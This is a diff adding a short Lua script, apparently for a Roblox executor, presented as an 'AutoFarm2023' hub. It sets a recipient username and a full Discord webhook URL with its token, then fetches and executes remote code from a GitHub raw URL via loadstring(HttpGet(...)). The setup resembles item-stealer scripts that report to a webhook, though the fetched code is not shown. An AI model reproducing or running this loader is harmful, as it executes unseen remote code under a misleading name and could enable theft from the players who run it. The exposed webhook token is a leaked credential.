@@ -1,0 +1,6 @@
+```lua
+_G.Username = "ZonkedXen"
+_G.HubName = "AutoFarm2023"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1095388806204624987/keCElFCBFLHdLLyHbTxEuw9EpoQspKHYCUA6QzwCXvBmDV5icJcfIO6s3o7Haf3CzrwK"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()```
